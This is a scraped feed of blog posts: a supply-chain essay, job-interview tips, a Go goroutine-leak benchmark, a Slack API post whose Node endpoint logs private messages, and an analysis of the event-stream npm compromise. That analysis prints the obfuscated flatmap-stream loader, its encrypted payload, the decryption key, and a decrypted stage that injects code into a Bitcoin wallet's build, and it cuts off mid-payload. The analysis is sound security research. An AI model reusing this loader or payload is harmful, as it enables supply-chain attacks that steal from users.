compromise tens of thousands of software packages, going undetected through the veil of ‚Äúmaintainership‚Äù.\nIn the past, I‚Äôve referred to this as ‚ÄúThe Risks of Single Maintainer Dependencies‚Äù: the overwhelming, often lonely, and sometimes dangerous experience of maintaining a widely distributed software package on your own. Like the owner of event-stream, most solo maintainers drift away, fading into the background to let their software go into disarray.\nThis was the case with Gorilla:\nThe original author and maintainer, moraes, had moved on a long time ago. kisielk and garyburd had the longest run, maintaining a mix of the HTTP libraries and gorilla/websocket respectively. I (elithrar) got involved sometime in 2014 or so, when I noticed kisielk doing a lot of the heavy lifting and wanted to help contribute back to the libraries I was using for a number of personal projects. Since about ~2018 or so, I was the (mostly) sole maintainer of everything but websocket, which is about the same time garyburd put out an (effectively unsuccessful) call for new maintainers there too.\nThe secure software supply-chain will never truly be strong and secure as long as a single solo maintainer is able to disrupt an entire ecosystem of packages by giving their package away to some bad actor. In truth, there is no secure software supply-chain: we are only as strong as the weakest among us and too often, those weak links in the chain are already broken, left to rot, or given up to those with nefarious purposes.\nWhenever I bring up this topic, someone always asks about money. Oh, money, life‚Äôs truest satisfaction! And yes! Money can be a powerful motivator for some people. But it‚Äôs a sad excuse for what the secure software supply-chain really needs: true reliability. The software industry can throw all the money it wants at maintainers of important open source projects, something Valve has started doing:\nGriffais says the company is also directly paying more than 100 open-source developers to work on the Proton compatibility layer, the Mesa graphics driver, and Vulkan, among other tasks like Steam for Linux and Chromebooks.\nbut at some point, it becomes unreasonable to ask just a handful of people to hold up the integrity, security, and viability of your companies entire product stack. If it‚Äôs that important, why not hire some of those people, build a team of maintainers, create processes for contribution, and allocate developer time into the open source? Too often I hear about solving open source problems by just throwing money at it, but at some point, the problems of scaling software delivery outweigh any amount you can possibly pay a few people. Let‚Äôs say you were building a house, it might make sense to have one or two people work on the foundation. But if you‚Äôre zoning and building an entire city block, I‚Äôd sure hope you‚Äôd put an entire team on planning, building, and maintaining those foundations. No amount of money will make just a few people build a strong and safe foundation all by themselves. But what we‚Äôre asking some open source maintainers to do is to plan, build, and coordinate the foundations for an entire world.\nAnd this is something the Gorilla maintainers recognized as well:\nNo. I don‚Äôt think any of us were after money here. The Gorilla Toolkit was, looking back at the most active maintainers, a passion project. We didn‚Äôt want it to be a job.\nFor them, it wasn‚Äôt about the money, so throwing any amount at the project wouldn‚Äôt have helped. It was about the software‚Äôs quality, maintainability, and the kind of intrinsic satisfaction it provided.\nSo then, how can we incentivize open source maintainers to maintain their software in a scalable, realistic way? Some people are motivated by the altruistic value they provide to a community. Some are motivated by fame, power, and recognition. Others still just want to have fun and work on something cool. It‚Äôs impossible to understand the complicated, interlinked way different people in an open source community are all motivated. Instead, the best solution is obvious: If you are on a team that relies on some piece of open source software, allocate real engineering time to contributing, being apart of the community, and helping maintain that software. Eventually, you‚Äôll get a really good sense of how a project operates and what motivates its main players. And better yet, you‚Äôll help alleviate the heavy burden of solo maintainership.\nSometimes, I like to think of software like its a wooden canoe, its many dependencies making up the wooden strips of the boat. When first built, it seems sturdy, strong, and able to withstand the harshest of conditions. Its first coat of oil finish is fresh and beautiful, its wood grains smooth and unbent. But as the years ware on, eventually, its finish fads, its wooden strips need replacing, and maybe, if it takes on water, it requires time and new material to repair. Neglected long enough, and its wood could mold and rot from the inside, completely compromising the integrity of the boat. And just like a boat, software requires time, energy, maintenance, and ‚Äúhands-on-deck‚Äù to ensure its many links in the secure software supply-chain are strong. Otherwise, the termites of time and the rot of bad-actors weaken links in the chain, compromising the stability of it all.\nIn the end, the maintainers of the Gorilla framework did the right thing: they decommissioned a widely used project that was at risk of rotting from the inside out. And instead of let it live in disarray or potentially fall into the hands of bad actors, it is simply gone. Its link on the chain of software has been purposefully broken to force anyone using it to choose a better, and hopefully, more secure option.\nI do believe that open source software is entitled to a lifecycle ‚Äî a beginning, a middle, and an end ‚Äî and that no project is required to live on forever. That may not make everyone happy, but such is life.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/there-is-no-secure-software-supply-chain/","summary":"The Matrix, 1999\nYears ago, entrepreneurs and innovators predicated that ‚Äúsoftware would eat the world‚Äù. And to little surprise, year after year, the world has become more and more reliant on software solutions. Often times, that software is (or indirectly depends on) some open source software, maintained by a group of people whose only affiliation to one another may be participation in that open source project‚Äôs community. But we‚Äôre in trouble.","title":"There is no secure software supply-chain."},{"content":"If you\u0026rsquo;d like a view a video version of this article, check out the following:\nIn the summer of 2022, I left my job at VMware for Amazon Web Services. It was a bitter sweet journey; I loved my time at VMware and I loved working on some cutting edge things in the Kubernetes space. Even just a few months latter, the project I was working on is now completely defunct.\nThe process to getting into AWS was no easy one. But in the end, over the course of interviewing at many different companies, I landed with 4 offers. I decided to go with AWS since it was the most compelling offer and I get to work on some really cool technologies I\u0026rsquo;m excited about.\nHere are my biggest pieces of advice for landing a job and the process I did to make it happen:\n1. Study I studied alot in preparation for my interviews. Ontop of my 40hr/week job at VMware, I was studying an additional 20-30 hours a week for about 4 weeks. This meant that for awhile, in the middle of July, all I was doing was working and studying.\nBut I was very focused on how I approached my interview prep and what things I wanted to tackle:\nThe 14 Principles to Ace Any Coding interview This is my all-time favorite resource for ramping up on coding interviews. It\u0026rsquo;s just an article, but it\u0026rsquo;s a critical way to think about coding interviews and how to approach them. Since there are only 14 patterns, they are easy enough to remember but also deep enough to apply to a myriad of different questions.\nIf you can master each of these, you will be well on your way to acing your coding interview.\nGrokking the Coding Interview I used this course as a supplement to the 14 patterns. It\u0026rsquo;s actually created by the author of the 14 patterns article but has alot of interactive questions you can go through to get ramped up quickly. Unfortunately, it is quite expensive. But I found the cost to be worth it.\nIf you don\u0026rsquo;t want to pay for the course, you can find almost all the same questions on Leetcode. You just have to do some more digging and figure out some of the solutions on your own.\nBlind 75 By this point, the blind 75 have become a notorious list of Leetcode questions that constantly come up in whiteboard style interviews. But I didn\u0026rsquo;t do all of them; I only did probably 20-30 or so. And I was very selective on which ones I wanted to tackle. You\u0026rsquo;ll notice that the are broken up into different categories. In general, if you can solve 1 or 2 linked list question, you can solve almost all of them. So I started skipping the ones that seemed to repeat or overlap.\nThis compounded with the 14 patterns since I was able to apply that knowledge alongside the various data structures and algorithms identified by the blind 75 as the most important.\nCracking the Coding Interview I did open up Cracking the Coding Interview, what most would consider the bible of whiteboard style interviews. But I only refreshed myself on the most important parts, mostly the first few chapters. I had read this book in the past (I think back in 2018?), and I didn\u0026rsquo;t feel it was necessary to go through the whole thing. Again, I felt I was already getting alot of benefit from the 14 patterns and the blind 75. So, as I skimmed the book, I skipped portions I felt overlapped with material I\u0026rsquo;d already covered or was too obscure the be relevant to my study plan.\nElements of Programming Interviews in Python I love Elements of Programming Interviews. It\u0026rsquo;s very deep, has alot of well thought out solutions, and is a great way to refresh your knowledge of a chosen language (in my case, Python).\nBut it\u0026rsquo;s a bit of a double edged sword; for my study plan, it was too much and I wanted to stay focused on the 14 patterns, the blind 75, and grokking the coding interview. So, instead, I used it as supplemental material, mostly to refresh myself on python3, it\u0026rsquo;s inner workings, and some tricks that are useful during interviews.\nAll in all, if I had to only focus on 2 of these, I\u0026rsquo;d say the 14 patterns to ace any coding interview and the Blind 75 are the most important. If you can master the patterns and have a good understanding of the Blind 75 (and the various categories), then you\u0026rsquo;ll be 95% of the way there.\n2. Get a referral Leverage your network! I hit up alot of people (just to see what\u0026rsquo;s out there) and it was massively successful. I\u0026rsquo;d say my favorite interviews all came from referrals. You also get the benefit of skipping the \u0026ldquo;get to know you\u0026rdquo; recruiter call. So reach out to people on LinkedIn, previous co-workers\n3. Company values Every company, no matter how big or small, has some values they live by. At Amazon, these are the leadership principles and you will be asked behavioral style questions based on these company values.\nDo your research! Come prepared to the interview knowing the company values.\n4. Take notes I consistently took notes after each interview. This was a big win since I was doing 3-4 interviews per week. After each interview I would note who I talked to, what we talked about, any advice they gave me about the next round, etc.\n5. Open source Open source is a great way to show off your code, show off what you\u0026rsquo;ve done, and how you\u0026rsquo;ve contributed to the broader open source world.\n6. Story telling Story telling in interviews is huge. A good story conveys your impact, what you did, the result of your actions, and much much more.\nI prefer 2 story telling methods:\nSTAR method This stands for Situation. Task. Action. Result. And people at Amazon love this for interviews (and for good reason). It tells the person listen the kind of impact you had across a certain situation and what you did to remedy it through your actions.\nMan in the hole method The man in the hole story telling method is abit more nuanced. You start from a \u0026ldquo;good place\u0026rdquo; and describe how some hole is getting dug out from under you. This is essentially the \u0026ldquo;situation\u0026rdquo; from the STAR method.\nBut you keep digging and you keep digging. Until it seems that there is no way you could possibly get out of the hole.\nThen, you describe the actions you took to get you (or your team / organization) out of that hole. It\u0026rsquo;s a very powerful method for describing high impact from things you did or delivered.\nThis advice you could really apply to any interview, but going back to basics and studying hard was a really great way to do well in my interviews and land a few different offers. Hope this was helpful! Until next time!!\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/aws-job/","summary":"If you\u0026rsquo;d like a view a video version of this article, check out the following:\nIn the summer of 2022, I left my job at VMware for Amazon Web Services. It was a bitter sweet journey; I loved my time at VMware and I loved working on some cutting edge things in the Kubernetes space. Even just a few months latter, the project I was working on is now completely defunct.","title":"How I got a job at Amazon as a software engineer"},{"content":"These simple go tests check the \u0026ldquo;leaky-ness\u0026rdquo; of using channels in Go. There are two methods described here; one using both a local context, and the parent context. When tests are run against both, the LeakyAsync method runs faster, but fails the leak checker as goroutines are not resolved or cleaned up.\nIn a production system with possibly thousands of go routines being spun up, this could result in massive memory leaks and a deadlock situation in the go binary.\nit\u0026rsquo;s recommended to use the leakchecker library to determine if goroutines get cleaned up.\npackage perform import ( \u0026#34;context\u0026#34; \u0026#34;math\u0026#34; ) func Selecting(parent chan struct{}) { i := 0 for { // Selecting within the infinite loop provides // control from the parent chan. // If the parent closes, we we can exit the loop and do any cleanup select { case \u0026lt;-parent: return default: } i++ if i == math.MaxInt32 { // Simulate an error that exits the process loop break } } } func LeakyAsync(parent chan struct{}) { // Start a go routine to read and block off the parent chan. // If the parent chan closes, we can clean up within the go routine // without having to perform a \u0026#34;select\u0026#34; on each iteration // However, this go routine will never be garbage collected // if the parent chan does not close and any subsequent cleanup will // be left to leak go func(c \u0026lt;-chan struct{}) { \u0026lt;-c }(parent) i := 0 for { i++ if i == math.MaxInt32 { // Simulate an error that exits the process loop break } } } func ContextAsync(parentCtx context.Context) { // Generate a child context from a passed in parent context. // If the parent is closed or canceled, // the child will also be closed. // We can then safely start a go routine that will block on the // child\u0026#39;s Done channel yet will still continue if the parent is canceled. ctx, cancel := context.WithCancel(parentCtx) defer cancel() go func(ctx context.Context) { \u0026lt;-ctx.Done() }(ctx) i := 0 for { i++ if i == math.MaxInt32 { // Simulate an error that exits the process loop break } } } package perform import ( \u0026#34;context\u0026#34; \u0026#34;testing\u0026#34; \u0026#34;github.com/fortytw2/leaktest\u0026#34; ) func TestSelecting(t *testing.T) { leakChecker := leaktest.Check(t) c := make(chan struct{}, 1) Selecting(c) leakChecker() c \u0026lt;- struct{}{} } func BenchmarkSelecting(b *testing.B) { for n := 0; n \u0026lt; b.N; n++ { c := make(chan struct{}) Selecting(c) } } func TestLeakyAsync(t *testing.T) { leakChecker := leaktest.Check(t) c := make(chan struct{}, 1) LeakyAsync(c) leakChecker() c \u0026lt;- struct{}{} } func BenchmarkLeakyAsync(b *testing.B) { for n := 0; n \u0026lt; b.N; n++ { c := make(chan struct{}) LeakyAsync(c) } } func TestContextAsync(t *testing.T) { leakChecker := leaktest.Check(t) ctx, cancel := context.WithCancel(context.Background()) ContextAsync(ctx) leakChecker() cancel() } func BenchmarkContextAsync(b *testing.B) { for n := 0; n \u0026lt; b.N; n++ { ctx, _ := context.WithCancel(context.Background()) ContextAsync(ctx) } } Run the test suite with the leakchecker library\n‚ùØ go test -v === RUN TestSelecting done checking leak --- PASS: TestSelecting (11.30s) === RUN TestLeakyAsync TestLeakyAsync: leaktest.go:132: leaktest: timed out checking goroutines TestLeakyAsync: leaktest.go:150: leaktest: leaked goroutine: goroutine 25 [chan receive]: perform.LeakyAsync.func1(0xc00008c1e0) /Users/jmcbride/workspace/channels-testing/perform.go:37 +0x34 created by perform.LeakyAsync /Users/jmcbride/workspace/channels-testing/perform.go:36 +0x3f --- FAIL: TestLeakyAsync (5.57s) === RUN TestContextAsync --- PASS: TestContextAsync (0.57s) Run the benchmarks with bench and benchmem to see performance\n‚ùØ go test -v -bench=. -benchmem -run \u0026#34;Bench*\u0026#34; goos: darwin goarch: amd64 pkg: perform BenchmarkSelecting BenchmarkSelecting-8 1\t10114375732 ns/op\t104 B/op\t2 allocs/op BenchmarkLeakyAsync BenchmarkLeakyAsync-8 2\t585489776 ns/op\t704 B/op\t3 allocs/op BenchmarkContextAsync BenchmarkContextAsync-8 2\t570398894 ns/op\t976 B/op\t9 allocs/op PASS ok perform\t13.655s LeakyAsync is roughly 2 times faster. But fails the leak checker test as the goroutine is not resolved.\nSelecting is slow because it performs a select on every iteration of the for loop.\nContextAsync is the best of both worlds. We don\u0026rsquo;t have to do a select within the for loop, yet we avoid a go routine leak.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/golang-performance/","summary":"These simple go tests check the \u0026ldquo;leaky-ness\u0026rdquo; of using channels in Go. There are two methods described here; one using both a local context, and the parent context. When tests are run against both, the LeakyAsync method runs faster, but fails the leak checker as goroutines are not resolved or cleaned up.\nIn a production system with possibly thousands of go routines being spun up, this could result in massive memory leaks and a deadlock situation in the go binary.","title":"Leaky Go Channels"},{"content":"(Note: this is from a blog archieve dated 2019/01/21. These opinions are my own and the slack API may have changed) TLDR: The Slack API exposes endpoints for a token holder to read all public and private messages.\nIn today\u0026rsquo;s world, violations of privacy are no surprise. Between all the leaks and data dumps, many people have accepted this as \u0026ldquo;just the world we live in\u0026rdquo;. But what if information was exposed that could be used to judge your work performance? Or steal your company‚Äôs intellectual property?\nIn this post, I will show how a Slack app could potentially leverage the Slack API to snoop on all public and private messages in a Slack workspace.\nThe veil of privacy A slack private message is not truly private. It is only hidden behind a thin veil of secrecy. With a workspace API token in hand, someone could lift that veil and see all.\nHere, with a short example, we will show how easily that can be done.\nFirst, the workspace owner or admin (depending on permissions), must access the Slack API website. There, they can build an app or give third party permissions to install a ‚Äúmarketplace‚Äù app. This is fairly straight forward and exposes several workspace tokens for the app to use. These are secret tokens, so they will be omitted in this example.\nNext, the app builder must enable the \u0026ldquo;message\u0026rdquo; workspace event. If I was a nefarious third-party app builder, I would simply request various permissions related to channel, im, or group \u0026ldquo;history\u0026rdquo;. For a full list of events and their permission scope, see this list.\nNext, if building the app, an endpoint must be designated for the API to send the event payload. This event triggers whenever a message is sent in a direct message channel or fulfills the event conditions. For a full description of the Slack API event loop, check this out.\nNow that we have the API set up to send event payloads, lets build a small Node Express app with an endpoint to receive the event json.\n// Events API endpoint app.post(\u0026#39;/events\u0026#39;, (req, res) =\u0026gt; { switch (req.body.type) { case \u0026#39;url_verification\u0026#39;: { // verifies events API endpoint res.send({ challenge: req.body.challenge }); break; } case \u0026#39;event_callback\u0026#39;: { // Respond immediately to prevent a timeout error res.sendStatus(200); const event = req.body.event; // Print the message contents if(event.type == \u0026#39;message\u0026#39;) { console.log(\u0026#39;User: \u0026#39;, event.user); console.log(\u0026#39;Text: \u0026#39;, event.text); // Do other nefarious things with events json } } } }) In this short node express endpoint, we can respond with the event token (necessary for verifying the app when challenged) and snoop on private messages. Let‚Äôs use ngork, start the express app, and send a private message:\nApp listening on port 8080! User: UBB22VCKC Text: hello world We can see that my Slack user ID is exposed and the message I sent is exposed. At this point, the app could do anything with this information.\nThis not only applies to single channel DMs, but the Slack API exposes several event subscriptions for message events in specific channels, specific groups, multiparty direct messages, private channels, and even every message sent in a workspace. The app builder simply must turn on these events request the appropriate permissions and the payload will be sent to the designated endpoint.\nIn short, it requires very little configuration and code to access and expose private Slack messages.\nWhat can you do? Be extremely mindful of the apps and permissions you give third party apps. Ask yourself basic questions about these permissions. If you are installing a fun GIF app, why dose it requires channel history permissions?\nUse Slack apps that have been made open source. Don\u0026rsquo;t hesitate to poke around a repository if you are questioning why an app requires certain permissions!\nRequest that any custom apps your Slack workspace uses are made open source.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/slack-is-watching/","summary":"(Note: this is from a blog archieve dated 2019/01/21. These opinions are my own and the slack API may have changed) TLDR: The Slack API exposes endpoints for a token holder to read all public and private messages.\nIn today\u0026rsquo;s world, violations of privacy are no surprise. Between all the leaks and data dumps, many people have accepted this as \u0026ldquo;just the world we live in\u0026rdquo;. But what if information was exposed that could be used to judge your work performance?","title":"Slack Is Always Watching ..."},{"content":"(Note: this post is from a legacy blog dated 12/14/2018 and some content or links may have changed)\nA few weeks ago, this issue was opened on a popular Node NPM package called Event Stream. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, this package is a key dependency for many other Node packages and has over 1 million downloads per week from NPM. The newly opened issue initially questioned a new, suspicious dependency that was pushed by a new, unknown maintainer. I was lucky enough to follow the community\u0026rsquo;s investigation into this issue and now, I hope to present the findings here. My goal with this piece is to hopefully shed some light on how easy it is for somebody to inject malicious code into NPM packages, the responsibility of open source maintainers, and the responsibility of the community.\nThe Malicious Code A Github user noticed that a new dependency named flatmap-stream was added to the event stream module. Through some investigative work, here is the raw code (un-minified by Github user FallingSnow) that was injected through flatmap. The flatmap module was an unknown, single author module.\n// var r = require, t = process; // function e(r) { // return Buffer.from(r, \u0026#34;hex\u0026#34;).toString() // } function decode(data) { return Buffer.from(data, \u0026#34;hex\u0026#34;).toString() } // var n = r(e(\u0026#34;2e2f746573742f64617461\u0026#34;)), // var n = require(decode(\u0026#34;2e2f746573742f64617461\u0026#34;)) // var n = require(\u0026#39;./test/data\u0026#39;) var n = [\u0026#34;75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629\u0026#34;,\u0026#34;db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1\u0026#34;,\u0026#34;63727970746f\u0026#34;,\u0026#34;656e76\u0026#34;,\u0026#34;6e706d5f7061636b6167655f6465736372697074696f6e\u0026#34;,\u0026#34;616573323536\u0026#34;,\u0026#34;6372656174654465636970686572\u0026#34;,\u0026#34;5f636f6d70696c65\u0026#34;,\u0026#34;686578\u0026#34;,\u0026#34;75746638\u0026#34;] // o = t[e(n[3])][e(n[4])]; // npm_package_description = process[decode(n[3])][decode(n[4])]; // npm_package_description = process[\u0026#39;env\u0026#39;][\u0026#39;npm_package_description\u0026#39;]; npm_package_description = \u0026#39;Get all children of a pid\u0026#39;; // Description from ps-tree (this is the aes decryption key) // if (!o) return; if (!npm_package_description) return; // var u = r(e(n[2]))[e(n[6])](e(n[5]), o), // var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description), var decipher = require(\u0026#39;crypto\u0026#39;)[\u0026#39;createDecipher\u0026#39;](\u0026#39;aes256\u0026#39;, npm_package_description), // a = u.update(n[0], e(n[8]), e(n[9])); // decoded = decipher.update(n[0], e(n[8]), e(n[9])); decoded = decipher.update(n[0], \u0026#39;hex\u0026#39;, \u0026#39;utf8\u0026#39;); console.log(n); // a += u.final(e(n[9])); decoded += decipher.final(\u0026#39;utf8\u0026#39;); // var f = new module.constructor; var newModule = new module.constructor; /**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/ // f.paths = module.paths, f[e(n[7])](a, \u0026#34;\u0026#34;), f.exports(n[1]) // newModule.paths = module.paths, newModule[\u0026#39;_compile\u0026#39;](decoded, \u0026#34;\u0026#34;), newModule.exports(n[1]) // newModule.paths = module.paths // newModule[\u0026#39;_compile\u0026#39;](decoded, \u0026#34;\u0026#34;) // Module.prototype._compile = function(content, filename) // newModule.exports(n[1]) As we can see, this is a fairly messy bit of code (as it had to be converted from mini-js to readable Node code). Also, the reader should note that there are some additional comments provided by FallingSnow, specifically the last bit. Caution! Do not run the last bit of code. You can simply use the above code to decrypt and see the injection attack.\nThe biggest thing that tips us off to this being malicious is the long stream of encrypted characters that are latter decrypted and used in a exports statement, effectively \u0026ldquo;compiling\u0026rdquo; and running whatever is held in the encrypted block. Further, we can see that the n variable holds an array of 2 separate strings. And finally, in the last block, we can see that the decrypted string from the n variable is used with a \u0026lsquo;_compile\u0026rsquo; statement, effectively running whatever parsed JavaScript might be held within the string.\nBrute Force a Solution Now, the key to deciphering the encrypted text depends directly on the npm_package_description variable, as we can see it is being used as the key in the createDecipher method. The initial thought from the community was that this key must be from the event stream package.json file itself (since the node runtime environment would set the modules description). However, this proved to not be the correct key and several Github users noted that it is possible to manually set a modules description from within the code. So, in order to find out what this injection attack is doing, we have to find the matching NPM package description.\nEventually, the community was able to find a listing of all public NPM package descriptions and brute force a solution out of this long list of descriptions. Brute forcing the solution out of public NPM package descriptions was a clever way to eventually land on the right key. Since the variable name is descriptive enough, we can effectively narrow it down from an infinite number of possibilities to only strings that are NPM package descriptions. If the key\u0026rsquo;s variable name hadn\u0026rsquo;t been as pronounced, it would have been more challenge to find the key. The correct key is as follows and comes from the copay-dash NPM module:\nnpm_package_description = \u0026#39;A Secure Bitcoin Wallet\u0026#39;; Using this as the key, we can see the decrypted code is as follows, in the two seperate payloads:\n/*@@*/ module.exports = function(e) { try { if (!/build\\:.*\\-release/.test(process.argv[2])) return; var t = process.env.npm_package_description, r = require(\u0026#34;fs\u0026#34;), i = \u0026#34;./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js\u0026#34;, n = r.statSync(i), c = r.readFileSync(i, \u0026#34;utf8\u0026#34;), o = require(\u0026#34;crypto\u0026#34;).createDecipher(\u0026#34;aes256\u0026#34;, t), s = o.update(e, \u0026#34;hex\u0026#34;, \u0026#34;utf8\u0026#34;); s = \u0026#34;\\n\u0026#34; + (s += o.final(\u0026#34;utf8\u0026#34;)); var a = c.indexOf(\u0026#34;\\n/*@@*/\u0026#34;); 0 \u0026lt;= a \u0026amp;\u0026amp; (c = c.substr(0, a)), r.writeFileSync(i, c + s, \u0026#34;utf8\u0026#34;), r.utimesSync(i, n.atime, n.mtime), process.on(\u0026#34;exit\u0026#34;, function() { try { r.writeFileSync(i, c, \u0026#34;utf8\u0026#34;), r.utimesSync(i, n.atime, n.mtime) } catch (e) {} }) } catch (e) {} }; /*@@*/ ! function() { function e() { try { var o = require(\u0026#34;http\u0026#34;), a = require(\u0026#34;crypto\u0026#34;), c = \u0026#34;-----BEGIN PUBLIC 